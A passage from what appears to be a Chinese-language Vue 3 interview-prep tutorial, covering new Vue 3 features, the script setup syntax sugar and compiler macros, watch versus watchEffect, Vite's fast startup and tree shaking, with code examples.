href=\\"#vue3升级了哪些重要功能\\">#</a> vue3升级了哪些重要功能</h3>\\n<p><strong>1. createApp</strong></p>\\n<pre class=\\"language-js\\"><code>// vue2\\nconst app = new Vue({/**选项**/})\\nVue.use(/****/)\\nVue.mixin(/****/)\\nVue.component(/****/)\\nVue.directive(/****/)\\n\\n// vue3\\nconst app = createApp({/**选项**/})\\napp.use(/****/)\\napp.mixin(/****/)\\napp.component(/****/)\\napp.directive(/****/)\\n</code></pre>\\n<p><strong>2. emits属性</strong></p>\\n<pre class=\\"language-js\\"><code>// 父组件\\n&lt;Hello :msg=&quot;msg&quot; @onSayHello=&quot;sayHello&quot;&gt;\\n\\n// 子组件\\nexport default {\\n    name: &#39;Hello&#39;,\\n    props: {\\n        msg: String\\n    },\\n    emits: [&#39;onSayHello&#39;], // 声明emits\\n    setup(props, {emit}) {\\n        emit(&#39;onSayHello&#39;, &#39;aaa&#39;)\\n    }\\n}\\n</code></pre>\\n<p><strong>3. 多事件</strong></p>\\n<pre class=\\"language-vue\\"><code>&lt;!-- 定义多个事件 --&gt;\\n&lt;button @click=&quot;one($event),two($event)&quot;&gt;提交&lt;/button&gt;\\n</code></pre>\\n<p><strong>4. Fragment</strong></p>\\n<pre class=\\"language-vue\\"><code>&lt;!-- vue2 --&gt;\\n&lt;template&gt;\\n    &lt;div&gt;\\n        &lt;h2&gt;{{title}}&lt;/h2&gt;\\n        &lt;p&gt;test&lt;/p&gt;\\n    &lt;/div&gt;\\n&lt;/template&gt;\\n\\n&lt;!-- vue3：不在使用div节点包裹 --&gt;\\n&lt;template&gt;\\n    &lt;h2&gt;{{title}}&lt;/h2&gt;\\n    &lt;p&gt;test&lt;/p&gt;\\n&lt;/template&gt;\\n</code></pre>\\n<p><strong>5. 移除.sync</strong></p>\\n<pre class=\\"language-vue\\"><code>&lt;!-- vue2 --&gt;\\n&lt;MyComponent :title.sync=&quot;title&quot; /&gt;\\n\\n&lt;!-- vue3 简写 --&gt;\\n&lt;MyComponent v-model:title=&quot;title&quot; /&gt;\\n&lt;!-- 非简写 --&gt;\\n&lt;MyComponent :title=&quot;title&quot; @update:title=&quot;title = $event&quot; /&gt;\\n</code></pre>\\n<p><strong>.sync用法</strong></p>\\n<p>父组件把属性给子组件，子组件修改了后还能同步到父组件中来</p>\\n<pre class=\\"language-vue\\"><code>&lt;template&gt;\\n  &lt;button @click=&quot;close&quot;&gt;关闭&lt;/button&gt;\\n&lt;/template&gt;\\n&lt;script&gt;\\nexport default {\\n    props: {\\n        isVisible: {\\n            type: Boolean,\\n            default: false\\n        }\\n    },\\n    methods: {\\n        close () {\\n            this.$emit(&#39;update:isVisible&#39;, false);\\n        }\\n    }\\n};\\n&lt;/script&gt;\\n</code></pre>\\n<pre class=\\"language-vue\\"><code>&lt;!-- 父组件使用 --&gt;\\n&lt;chlid-component :isVisible.sync=&quot;isVisible&quot;&gt;&lt;/chlid-component&gt;\\n</code></pre>\\n<pre class=\\"language-vue\\"><code>&lt;text-doc :title=&quot;doc.title&quot; @update:title=&quot;doc.title = $event&quot;&gt;&lt;/text-doc&gt;\\n\\n&lt;!-- 为了方便期间，为这种模式提供一个简写 .sync --&gt;\\n&lt;text-doc :title.sync=&quot;doc.title&quot; /&gt;\\n</code></pre>\\n<p><strong>6. 异步组件的写法</strong></p>\\n<pre class=\\"language-js\\"><code>// vue2写法\\nnew Vue({\\n    components: {\\n        &#39;my-component&#39;: ()=&gt;import(&#39;./my-component.vue&#39;)\\n    }\\n})\\n</code></pre>\\n<pre class=\\"language-js\\"><code>// vue3写法\\nimport {createApp, defineAsyncComponent} from &#39;vue&#39;\\n\\nexport default {\\n    components: {\\n        AsyncComponent: defineAsyncComponent(()=&gt;import(&#39;./AsyncComponent.vue&#39;))\\n    }\\n}\\n</code></pre>\\n<p><strong>7. 移除filter</strong></p>\\n<pre class=\\"language-vue\\"><code>&lt;!-- 以下filter在vue3中不可用了 --&gt;\\n\\n&lt;!-- 在花括号中 --&gt;\\n{{message | capitalize}}\\n\\n&lt;!-- 在v-bind中 --&gt;\\n&lt;div v-bind:id=&quot;rawId | formatId&quot;&gt;&lt;/div&gt;\\n</code></pre>\\n<p><strong>8. Teleport</strong></p>\\n<pre class=\\"language-vue\\"><code>&lt;button @click=&quot;modalOpen = true&quot;&gt;\\n open\\n&lt;/button&gt;\\n\\n&lt;!-- 通过teleport把弹窗放到body下 --&gt;\\n&lt;teleport to=&quot;body&quot;&gt;\\n &lt;div v-if=&quot;modalOpen&quot; classs=&quot;modal&quot;&gt;\\n   &lt;div&gt;\\n     teleport弹窗，父元素是body\\n     &lt;button @click=&quot;modalOpen = false&quot;&gt;close&lt;/button&gt;\\n   &lt;/div&gt;\\n &lt;/div&gt;\\n&lt;/teleport&gt;\\n</code></pre>\\n<p><strong>9. Suspense</strong></p>\\n<pre class=\\"language-html\\"><code>&lt;Suspense&gt;\\n &lt;template&gt;\\n    &lt;!-- 异步组件 --&gt;\\n   &lt;Test1 /&gt;  \\n &lt;/template&gt;\\n &lt;!-- fallback是一个具名插槽，即Suspense内部有两个slot，一个具名插槽fallback --&gt;\\n &lt;template #fallback&gt;\\n    loading...\\n &lt;/template&gt;\\n&lt;/Suspense&gt;\\n</code></pre>\\n<p><strong>10. Composition API</strong></p>\\n<ul>\\n<li><code>reactive</code></li>\\n<li><code>ref</code></li>\\n<li><code>readonly</code></li>\\n<li><code>watch</code>和<code>watchEffect</code></li>\\n<li><code>setup</code></li>\\n<li>生命周期钩子函数</li>\\n</ul>\\n<h3 id=\\"vue3-2-setup-语法糖汇总\\"><a class=\\"header-anchor\\" href=\\"#vue3-2-setup-语法糖汇总\\">#</a> Vue3.2 setup 语法糖汇总</h3>\\n<p>提示：<code>vue3.2</code> 版本开始才能使用语法糖！</p>\\n<p>在 <code>Vue3.0</code> 中变量必须  <code>return</code>  出来， <code>template</code> 中才能使用；而在 <code>Vue3.2</code> 中只需要在  <code>script</code>  标签上加上  <code>setup</code>  属性，无需  <code>return</code>， <code>template</code>  便可直接使用，非常的香啊！</p>\\n<p><strong>1. 如何使用setup语法糖</strong></p>\\n<p>只需在  <code>script</code>  标签上写上 <code>setup</code></p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n&lt;/template&gt;\\n&lt;script setup&gt;\\n&lt;/script&gt;\\n&lt;style scoped lang=&quot;less&quot;&gt;\\n&lt;/style&gt;\\n</code></pre>\\n<p><strong>2. data数据的使用</strong></p>\\n<p>由于  <code>setup</code>  不需写  <code>return</code> ，所以直接声明数据即可</p>\\n<pre class=\\"language-html\\"><code>&lt;script setup&gt;\\nimport {\\n  ref,\\n  reactive,\\n  toRefs,\\n} from &#39;vue&#39;\\n\\nconst data = reactive({\\n  patternVisible: false,\\n  debugVisible: false,\\n  aboutExeVisible: false,\\n})\\n\\nconst content = ref(&#39;content&#39;)\\n//使用toRefs解构\\nconst { patternVisible, debugVisible, aboutExeVisible } = toRefs(data)\\n&lt;/script&gt;\\n</code></pre>\\n<p><strong>3. method方法的使用</strong></p>\\n<pre class=\\"language-html\\"><code>&lt;template &gt;\\n  &lt;button @click=&quot;onClickHelp&quot;&gt;帮助&lt;/button&gt;\\n&lt;/template&gt;\\n&lt;script setup&gt;\\nimport {reactive} from &#39;vue&#39;\\n\\nconst data = reactive({\\n  aboutExeVisible: false,\\n})\\n// 点击帮助\\nconst onClickHelp = () =&gt; {\\n  console.log(`帮助`)\\n  data.aboutExeVisible = true\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<p><strong>4. watchEffect的使用</strong></p>\\n<pre class=\\"language-html\\"><code>&lt;script setup&gt;\\nimport {\\n  ref,\\n  watchEffect,\\n} from &#39;vue&#39;\\n\\nlet sum = ref(0)\\n\\nwatchEffect(()=&gt;{\\n  const x1 = sum.value\\n  console.log(&#39;watchEffect所指定的回调执行了&#39;)\\n})\\n&lt;/script&gt;\\n</code></pre>\\n<p><strong>5. watch的使用</strong></p>\\n<pre class=\\"language-html\\"><code>&lt;script setup&gt;\\nimport {\\n  reactive,\\n  watch,\\n} from &#39;vue&#39;\\n//数据\\nlet sum = ref(0)\\nlet msg = ref(&#39;hello&#39;)\\nlet person = reactive({\\n  name:&#39;张三&#39;,\\n  age:18,\\n  job:{\\n    j1:{\\n      salary:20\\n    }\\n  }\\n})\\n// 两种监听格式\\nwatch([sum,msg],(newValue,oldValue)=&gt;{\\n    console.log(&#39;sum或msg变了&#39;,newValue,oldValue)\\n  },\\n  {immediate:true}\\n)\\n\\nwatch(()=&gt;person.job,(newValue,oldValue)=&gt;{\\n  console.log(&#39;person的job变化了&#39;,newValue,oldValue)\\n},{deep:true}) \\n\\n&lt;/script&gt;\\n</code></pre>\\n<p><strong>6. computed计算属性的使用</strong></p>\\n<p><code>computed</code> 计算属性有两种写法(简写和考虑读写的完整写法)</p>\\n<pre class=\\"language-html\\"><code>&lt;script setup&gt;\\nimport {\\n  reactive,\\n  computed,\\n} from &#39;vue&#39;\\n\\n// 数据\\nlet person = reactive({\\n  firstName:&#39;poetry&#39;,\\n  lastName:&#39;x&#39;\\n})\\n\\n// 计算属性简写\\nperson.fullName = computed(()=&gt;{\\n  return person.firstName + &#39;-&#39; + person.lastName\\n})\\n\\n// 完整写法\\nperson.fullName = computed({\\n  get(){\\n    return person.firstName + &#39;-&#39; + person.lastName\\n  },\\n  set(value){\\n    const nameArr = value.split(&#39;-&#39;)\\n    person.firstName = nameArr[0]\\n    person.lastName = nameArr[1]\\n  }\\n})\\n&lt;/script&gt;\\n</code></pre>\\n<p><strong>7. props父子传值的使用</strong></p>\\n<p>父组件代码如下（示例）：</p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n  &lt;child :name=&#39;name&#39;/&gt;  \\n&lt;/template&gt;\\n\\n&lt;script setup&gt;\\n  import {ref} from &#39;vue&#39;\\n  // 引入子组件\\n  import child from &#39;./child.vue&#39;\\n  let name= ref(&#39;poetry&#39;)\\n&lt;/script&gt;\\n</code></pre>\\n<p>子组件代码如下（示例）：</p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n  &lt;span&gt;{{props.name}}&lt;/span&gt;\\n&lt;/template&gt;\\n\\n&lt;script setup&gt;\\nimport { defineProps } from &#39;vue&#39;\\n// 声明props\\nconst props = defineProps({\\n  name: {\\n    type: String,\\n    default: &#39;poetries&#39;\\n  }\\n})  \\n// 或者\\n//const props = defineProps([&#39;name&#39;])\\n&lt;/script&gt;\\n</code></pre>\\n<p><strong>8. emit子父传值的使用</strong></p>\\n<p>父组件代码如下（示例）：</p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n  &lt;AdoutExe @aboutExeVisible=&quot;aboutExeHandleCancel&quot; /&gt;\\n&lt;/template&gt;\\n&lt;script setup&gt;\\nimport { reactive } from &#39;vue&#39;\\n// 导入子组件\\nimport AdoutExe from &#39;../components/AdoutExeCom&#39;\\n\\nconst data = reactive({\\n  aboutExeVisible: false, \\n})\\n// content组件ref\\n\\n// 关于系统隐藏\\nconst aboutExeHandleCancel = () =&gt; {\\n  data.aboutExeVisible = false\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<p>子组件代码如下（示例）：</p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n  &lt;a-button @click=&quot;isOk&quot;&gt;\\n    确定\\n  &lt;/a-button&gt;\\n&lt;/template&gt;\\n&lt;script setup&gt;\\nimport { defineEmits } from &#39;vue&#39;;\\n\\n// emit\\nconst emit = defineEmits([&#39;aboutExeVisible&#39;])\\n/**\\n * 方法\\n */\\n// 点击确定按钮\\nconst isOk = () =&gt; {\\n  emit(&#39;aboutExeVisible&#39;);\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<p><strong>9. 获取子组件ref变量和defineExpose暴露</strong></p>\\n<p>即<code>vue2</code>中的获取子组件的<code>ref</code>，直接在父组件中控制子组件方法和变量的方法</p>\\n<p>父组件代码如下（示例）：</p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n  &lt;button @click=&quot;onClickSetUp&quot;&gt;点击&lt;/button&gt;\\n  &lt;Content ref=&quot;content&quot; /&gt;\\n&lt;/template&gt;\\n\\n&lt;script setup&gt;\\nimport {ref} from &#39;vue&#39;\\n\\n// content组件ref\\nconst content = ref(&#39;content&#39;)\\n// 点击设置\\nconst onClickSetUp = ({ key }) =&gt; {\\n  content.value.modelVisible = true\\n}\\n&lt;/script&gt;\\n&lt;style scoped lang=&quot;less&quot;&gt;\\n&lt;/style&gt;\\n</code></pre>\\n<p>子组件代码如下（示例）：</p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n   &lt;p&gt;{{data }}&lt;/p&gt;\\n&lt;/template&gt;\\n\\n&lt;script setup&gt;\\nimport {\\n  reactive,\\n  toRefs\\n} from &#39;vue&#39;\\n\\n/**\\n * 数据部分\\n* */\\nconst data = reactive({\\n  modelVisible: false,\\n  historyVisible: false, \\n  reportVisible: false, \\n})\\n\\ndefineExpose({\\n  ...toRefs(data),\\n})\\n&lt;/script&gt;\\n</code></pre>\\n<p><strong>10. 路由useRoute和useRouter的使用</strong></p>\\n<pre class=\\"language-html\\"><code>&lt;script setup&gt;\\n  import { useRoute, useRouter } from &#39;vue-router&#39;\\n\\n  // 声明\\n  const route = useRoute()\\n  const router = useRouter()\\n\\n  // 获取query\\n  console.log(route.query)\\n  // 获取params\\n  console.log(route.params)\\n\\n  // 路由跳转\\n  router.push({\\n    path: `/index`\\n  })\\n&lt;/script&gt;\\n</code></pre>\\n<p><strong>11. store仓库的使用</strong></p>\\n<pre class=\\"language-html\\"><code>&lt;script setup&gt;\\n  import { useStore } from &#39;vuex&#39;\\n  import { num } from &#39;../store/index&#39;\\n\\n  const store = useStore(num)\\n\\n  // 获取Vuex的state\\n  console.log(store.state.number)\\n  // 获取Vuex的getters\\n  console.log(store.state.getNumber)\\n\\n  // 提交mutations\\n  store.commit(&#39;fnName&#39;)\\n\\n  // 分发actions的方法\\n  store.dispatch(&#39;fnName&#39;)\\n&lt;/script&gt;\\n</code></pre>\\n<p><strong>12. await的支持</strong></p>\\n<p><code>setup</code>语法糖中可直接使用<code>await</code>，不需要写<code>async</code>，<code>setup</code>会自动变成<code>async setup</code></p>\\n<pre class=\\"language-html\\"><code>&lt;script setup&gt;\\n  import api from &#39;../api/Api&#39;\\n  const data = await Api.getData()\\n  console.log(data)\\n&lt;/script&gt;\\n</code></pre>\\n<p><strong>13. provide 和 inject 祖孙传值</strong></p>\\n<p>父组件代码如下（示例）：</p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n  &lt;AdoutExe /&gt;\\n&lt;/template&gt;\\n\\n&lt;script setup&gt;\\n  import { ref,provide } from &#39;vue&#39;\\n  import AdoutExe from &#39;@/components/AdoutExeCom&#39;\\n\\n  let name = ref(&#39;py&#39;)\\n  // 使用provide\\n  provide(&#39;provideState&#39;, {\\n    name,\\n    changeName: () =&gt; {\\n      name.value = &#39;poetries&#39;\\n    }\\n  })\\n&lt;/script&gt;\\n</code></pre>\\n<p>子组件代码如下（示例）：</p>\\n<pre class=\\"language-html\\"><code>&lt;script setup&gt;\\n  import { inject } from &#39;vue&#39;\\n  const provideState = inject(&#39;provideState&#39;)\\n\\n  provideState.changeName()\\n&lt;/script&gt;\\n</code></pre>\\n<h3 id=\\"definemodel-与-defineoptions-vue-3-3-新增编译器宏\\"><a class=\\"header-anchor\\" href=\\"#definemodel-与-defineoptions-vue-3-3-新增编译器宏\\">#</a> defineModel 与 defineOptions（Vue 3.3+ 新增编译器宏）</h3>\\n<blockquote>\\n<p>Vue 3.3/3.4 为 <code>&lt;script setup&gt;</code> 补齐了两个常用宏，面试常问「<code>&lt;script setup&gt;</code> 里怎么定义组件名 / 怎么简化 v-model」。</p>\\n</blockquote>\\n<p><strong><code>defineModel</code>（Vue 3.4+）——简化自定义组件的 <code>v-model</code></strong></p>\\n<p>以前在 <code>&lt;script setup&gt;</code> 里实现 <code>v-model</code>，要声明 <code>modelValue</code> prop + emit <code>update:modelValue</code>，样板很多：</p>\\n<pre class=\\"language-vue\\"><code>&lt;!-- 旧写法：手动 props + emit --&gt;\\n&lt;script setup&gt;\\nconst props = defineProps([&#39;modelValue&#39;])\\nconst emit = defineEmits([&#39;update:modelValue&#39;])\\n&lt;/script&gt;\\n&lt;template&gt;\\n  &lt;input :value=&quot;modelValue&quot; @input=&quot;emit(&#39;update:modelValue&#39;, $event.target.value)&quot;&gt;\\n&lt;/template&gt;\\n</code></pre>\\n<p>用 <code>defineModel</code> 后一行搞定，返回一个可读写的 ref，读 <code>.value</code>、写 <code>.value</code> 会自动 emit 更新：</p>\\n<pre class=\\"language-vue\\"><code>&lt;script setup&gt;\\nconst model = defineModel()               // 对应父组件的 v-model\\n// 具名 model：父组件 v-model:title=&quot;x&quot;\\nconst title = defineModel(&#39;title&#39;)\\n// 带类型和选项\\nconst count = defineModel(&#39;count&#39;, { type: Number, default: 0 })\\n&lt;/script&gt;\\n&lt;template&gt;\\n  &lt;input v-model=&quot;model&quot;&gt;                 &lt;!-- 直接用,双向绑定自动打通 --&gt;\\n&lt;/template&gt;\\n</code></pre>\\n<p><strong><code>defineOptions</code>（Vue 3.3+）——在 <code>&lt;script setup&gt;</code> 里定义组件选项</strong></p>\\n<p><code>&lt;script setup&gt;</code> 没有地方写 <code>name</code>、<code>inheritAttrs</code> 这类选项，以前要再开一个普通 <code>&lt;script&gt;</code> 块。<code>defineOptions</code> 让你直接在 setup 里写：</p>\\n<pre class=\\"language-vue\\"><code>&lt;script setup&gt;\\ndefineOptions({\\n  name: &#39;MyComponent&#39;,      // 组件名（用于 keep-alive 的 include、递归组件、devtools）\\n  inheritAttrs: false       // 关闭 attrs 自动透传到根元素\\n})\\n&lt;/script&gt;\\n</code></pre>\\n<p><strong>要点</strong>：<code>defineModel</code>/<code>defineOptions</code> 和 <code>defineProps</code>/<code>defineEmits</code>/<code>defineExpose</code> 一样是<strong>编译期宏</strong>（不用 import，编译后展开成对应的运行时代码）。有了它们，<code>&lt;script setup&gt;</code> 就覆盖了组件的全部能力，不用再退回选项式或额外加 <code>&lt;script&gt;</code> 块。</p>\\n<h3 id=\\"v-model参数的用法\\"><a class=\\"header-anchor\\" href=\\"#v-model参数的用法\\">#</a> v-model参数的用法</h3>\\n<p><strong>vue2自定义组件model</strong></p>\\n<pre class=\\"language-vue\\"><code>&lt;!-- 自定义 v-model --&gt;\\n&lt;CustomVModel v-model=&quot;name&quot;/&gt; \\n</code></pre>\\n<pre class=\\"language-vue\\"><code>&lt;!-- CustomVModel --&gt;\\n&lt;template&gt;\\n  &lt;!-- 例如：vue 颜色选择 --&gt;\\n  &lt;input type=&quot;text&quot;\\n    :value=&quot;text&quot;\\n    @input=&quot;$emit(&#39;change&#39;, $event.target.value)&quot;\\n  &gt;\\n  &lt;!--\\n    1. 上面的 input 使用了 :value 而不是 v-model\\n    2. 上面的 change 和 model.event 要对应起来\\n    3. text 属性对应起来\\n  --&gt;\\n&lt;/template&gt;\\n\\n&lt;script&gt;\\nexport default {\\n    model: {\\n        prop: &#39;text&#39;, // 对应 props text\\n        event: &#39;change&#39;\\n    },\\n    props: {\\n        text1: String,\\n        default() {\\n            return &#39;&#39;\\n        }\\n    }\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<p><strong>vue3自定义组件model</strong></p>\\n<pre class=\\"language-vue\\"><code>&lt;!-- index.vue 绑定一个值 --&gt;\\n&lt;CustomVModel v-model=&quot;name&quot;/&gt; \\n\\n&lt;!-- CustomVModel.vue --&gt;\\n&lt;template&gt;\\n    &lt;input type=&quot;text&quot;\\n        :value=&quot;modelValue&quot;\\n        @input=&quot;$emit(&#39;update:modelValue&#39;, $event.target.value)&quot;\\n    &gt;\\n&lt;/template&gt;\\n\\n&lt;script&gt;\\nexport default {\\n    props: {\\n        modelValue: String,\\n    }\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<pre class=\\"language-vue\\"><code>&lt;!-- UserInfo组件 --&gt;\\n&lt;template&gt;\\n  &lt;input :value=&quot;name&quot; @input=&quot;$emit(&#39;update:name&#39;, $event.target.value)&quot;/&gt;\\n  &lt;input :value=&quot;age&quot; @input=&quot;$emit(&#39;update:age&#39;, $event.target.value)&quot;/&gt;\\n&lt;/template&gt;\\n\\n&lt;script&gt;\\nexport default {\\n  name: &#39;UserInfo&#39;,\\n  props: {\\n    name: String,\\n    age: String\\n  }\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<pre class=\\"language-vue\\"><code>&lt;!-- 绑定多个值\\n使用 vue3中v-model可绑定多个属性 --&gt;\\n&lt;user-info\\n    v-model:name=&quot;name&quot;\\n    v-model:age=&quot;age&quot;\\n&gt;&lt;/user-info&gt;\\n</code></pre>\\n<h3 id=\\"watch和watcheffect的区别\\"><a class=\\"header-anchor\\" href=\\"#watch和watcheffect的区别\\">#</a> watch和watchEffect的区别</h3>\\n<ul>\\n<li>两者都可以监听<code>data</code>属性变化</li>\\n<li><code>watch</code>需要明确监听哪个属性</li>\\n<li><code>watchEffect</code>会根据其中的属性，自动监听其变化</li>\\n</ul>\\n<pre class=\\"language-vue\\"><code>&lt;template&gt;\\n    &lt;p&gt;watch vs watchEffect&lt;/p&gt;\\n    &lt;p&gt;{{numberRef}}&lt;/p&gt;\\n    &lt;p&gt;{{name}} {{age}}&lt;/p&gt;\\n&lt;/template&gt;\\n\\n&lt;script&gt;\\nimport { reactive, ref, toRefs, watch, watchEffect } from &#39;vue&#39;\\n\\nexport default {\\n    name: &#39;Watch&#39;,\\n    setup() {\\n        const numberRef = ref(100)\\n        const state = reactive({\\n            name: &#39;test&#39;,\\n            age: 20\\n        })\\n\\n        watchEffect(() =&gt; {\\n            // 初始化时，一定会执行一次（收集要监听的数据）\\n            console.log(&#39;hello watchEffect&#39;)\\n        })\\n        watchEffect(() =&gt; {\\n            console.log(&#39;state.name&#39;, state.name)\\n        })\\n        watchEffect(() =&gt; {\\n            console.log(&#39;state.age&#39;, state.age)\\n        })\\n        watchEffect(() =&gt; {\\n            console.log(&#39;state.age&#39;, state.age)\\n            console.log(&#39;state.name&#39;, state.name)\\n        })\\n        setTimeout(() =&gt; {\\n            state.age = 25\\n        }, 1500)\\n        setTimeout(() =&gt; {\\n            state.name = &#39;testA&#39;\\n        }, 3000)\\n        \\n\\n        // ref直接写\\n        // watch(numberRef, (newNumber, oldNumber) =&gt; {\\n        //     console.log(&#39;ref watch&#39;, newNumber, oldNumber)\\n        // }\\n        // // , {\\n        // //     immediate: true // 初始化之前就监听，可选\\n        // // }\\n        // )\\n\\n        // setTimeout(() =&gt; {\\n        //     numberRef.value = 200\\n        // }, 1500)\\n\\n        // watch(\\n        //     // 第一个参数，确定要监听哪个属性\\n        //     () =&gt; state.age,\\n\\n        //     // 第二个参数，回调函数\\n        //     (newAge, oldAge) =&gt; {\\n        //         console.log(&#39;state watch&#39;, newAge, oldAge)\\n        //     },\\n\\n        //     // 第三个参数，配置项\\n        //     {\\n        //         immediate: true, // 初始化之前就监听，可选\\n        //         // deep: true // 深度监听\\n        //     }\\n        // )\\n\\n        // setTimeout(() =&gt; {\\n        //     state.age = 25\\n        // }, 1500)\\n        // setTimeout(() =&gt; {\\n        //     state.name = &#39;zhangsanA&#39;\\n        // }, 3000)\\n\\n        return {\\n            numberRef,\\n            ...toRefs(state)\\n        }\\n    }\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<h3 id=\\"setup中如何获取组件实例\\"><a class=\\"header-anchor\\" href=\\"#setup中如何获取组件实例\\">#</a> setup中如何获取组件实例</h3>\\n<ul>\\n<li>在<code>setup</code>和其他<code>composition API</code>中没有<code>this</code></li>\\n<li>通过<code>getCurrentInstance</code>获取当前实例</li>\\n<li>若使用<code>options API</code>可以照常使用<code>this</code></li>\\n</ul>\\n<pre class=\\"language-js\\"><code>import { onMounted, getCurrentInstance } from &#39;vue&#39;\\n\\nexport default {\\n    name: &#39;GetInstance&#39;,\\n    data() {\\n        return {\\n            x: 1,\\n            y: 2\\n        }\\n    }, \\n    setup() { // setup是created beforeCreate 合集 组件还没正式初始化\\n        console.log(&#39;this1&#39;, this) // undefined\\n\\n        onMounted(() =&gt; {\\n            console.log(&#39;this in onMounted&#39;, this) // undefined\\n            console.log(&#39;x&#39;, instance.data.x) // 1  onMounted中组件已经初始化了\\n        })\\n \\n        const instance = getCurrentInstance()\\n        console.log(&#39;instance&#39;, instance)\\n    },\\n    mounted() {\\n        console.log(&#39;this2&#39;, this)\\n        console.log(&#39;y&#39;, this.y)\\n    }\\n}\\n</code></pre>\\n<h3 id=\\"vite-为什么启动非常快\\"><a class=\\"header-anchor\\" href=\\"#vite-为什么启动非常快\\">#</a> Vite 为什么启动非常快</h3>\\n<ul>\\n<li>开发环境使用<code>Es6 Module</code>，无需打包，非常快</li>\\n<li>生产环境使用<code>rollup</code>，并不会快很多</li>\\n</ul>\\n<p><strong>ES Module 在浏览器中的应用</strong></p>\\n<pre class=\\"language-html\\"><code>&lt;p&gt;基本演示&lt;/p&gt;\\n&lt;script type=&quot;module&quot;&gt;\\n    import add from &#39;./src/add.js&#39;\\n\\n    const res = add(1, 2)\\n    console.log(&#39;add res&#39;, res)\\n&lt;/script&gt;\\n&lt;script type=&quot;module&quot;&gt;\\n    import { add, multi } from &#39;./src/math.js&#39;\\n    console.log(&#39;add res&#39;, add(10, 20))\\n    console.log(&#39;multi res&#39;, multi(10, 20))\\n&lt;/script&gt;\\n</code></pre>\\n<pre class=\\"language-html\\"><code>&lt;p&gt;外链引用&lt;/p&gt;\\n&lt;script type=&quot;module&quot; src=&quot;./src/index.js&quot;&gt;&lt;/script&gt;\\n</code></pre>\\n<pre class=\\"language-html\\"><code>&lt;p&gt;远程引用&lt;/p&gt;\\n&lt;script type=&quot;module&quot;&gt;\\n    import { createStore } from &#39;https://unpkg.com/redux@latest/es/redux.mjs&#39; // es module规范mjs\\n    console.log(&#39;createStore&#39;, createStore)\\n&lt;/script&gt;\\n</code></pre>\\n<pre class=\\"language-html\\"><code>&lt;p&gt;动态引入&lt;/p&gt;\\n&lt;button id=&quot;btn1&quot;&gt;load1&lt;/button&gt;\\n&lt;button id=&quot;btn2&quot;&gt;load2&lt;/button&gt;\\n\\n&lt;script type=&quot;module&quot;&gt;\\n    document.getElementById(&#39;btn1&#39;).addEventListener(&#39;click&#39;, async () =&gt; {\\n        const add = await import(&#39;./src/add.js&#39;)\\n        const res = add.default(1, 2)\\n        console.log(&#39;add res&#39;, res)\\n    })\\n    document.getElementById(&#39;btn2&#39;).addEventListener(&#39;click&#39;, async () =&gt; {\\n        const { add, multi } = await import(&#39;./src/math.js&#39;)\\n        console.log(&#39;add res&#39;, add(10, 20))\\n        console.log(&#39;multi res&#39;, multi(10, 20))\\n    })\\n&lt;/script&gt;\\n</code></pre>\\n<h3 id=\\"说说vue-3-0中tree-shaking特性-举例说明一下\\"><a class=\\"header-anchor\\" href=\\"#说说vue-3-0中tree-shaking特性-举例说明一下\\">#</a> 说说Vue 3.0中Tree shaking特性？举例说明一下？</h3>\\n<p><strong>一、是什么</strong></p>\\n<p><code>Tree shaking</code> 是一种通过清除多余代码方式来优化项目打包体积的技术，专业术语叫 <code>Dead code elimination</code></p>\\n<p>简单来讲，就是在保持代码运行结果不变的前提下，去除无用的代码</p>\\n<p>如果把代码打包比作制作蛋糕，传统的方式是把鸡蛋（带壳）全部丢进去搅拌，然后放入烤箱，最后把（没有用的）蛋壳全部挑选并剔除出去</p>\\n<p>而<code>treeshaking</code>则是一开始就把有用的蛋白蛋黄（import）放入搅拌，最后直接作出蛋糕</p>\\n<p>也就是说 ，<code>tree shaking</code> 其实是找出使用的代码</p>\\n<p>在<code>Vue2</code>中，无论我们使用什么功能，它们最终都会出现在生产代码中。主要原因是<code>Vue</code>实例在项目中是单例的，捆绑程序无法检测到该对象的哪些属性在代码中被使用到</p>\\n<pre class=\\"language-js\\"><code>import Vue from &#39;vue&#39;\\n \\nVue.nextTick(() =&gt; {})\\n</code></pre>\\n<p>而<code>Vue3</code>源码引入<code>tree shaking</code>特性，将全局 API 进行分块。如果您不使用其某些功能，它们将不会包含在您的基础包中</p>\\n<pre class=\\"language-js\\"><code>import { nextTick, observable } from &#39;vue&#39;\\n \\nnextTick(() =&gt; {})\\n</code></pre>\\n<p><strong>二、如何做</strong></p>\\n<p><code>Tree shaking</code>是基于<code>ES6</code>模板语法（<code>import</code>与<code>exports</code>），主要是借助<code>ES6</code>模块的静态编译思想，在编译时就能确定模块的依赖关系，以及输入和输出的变量</p>\\n<p><code>Tree shaking</code>无非就是做了两件事：</p>\\n<ul>\\n<li>编译阶段利用<code>ES6 Module</code>判断哪些模块已经加载</li>\\n<li>判断那些模块和变量未被使用或者引用，进而删除对应代码</li>\\n</ul>\\n<p>下面就来举个例子：</p>\\n<p>通过脚手架<code>vue-cli</code>安装<code>Vue2</code>与<code>Vue3</code>项目</p>\\n<pre class=\\"language-c\\"><code>vue create vue-demo\\n</code></pre>\\n<p><strong>Vue2 项目</strong></p>\\n<p>组件中使用<code>data</code>属性</p>\\n<pre class=\\"language-vue\\"><code>&lt;script&gt;\\n    export default {\\n        data: () =&gt; ({\\n            count: 1,\\n        }),\\n    };\\n&lt;/script&gt;\\n</code></pre>\\n<p>对项目进行打包，体积如下图</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/3886fc8c2dbc3985.png\\" alt=\\"\\"></p>\\n<p>为组件设置其他属性（<code>compted</code>、<code>watch</code>）</p>\\n<pre class=\\"language-js\\"><code>export default {\\n    data: () =&gt; ({\\n        question:&quot;&quot;, \\n        count: 1,\\n    }),\\n    computed: {\\n        double: function () {\\n            return this.count * 2;\\n        },\\n    },\\n    watch: {\\n        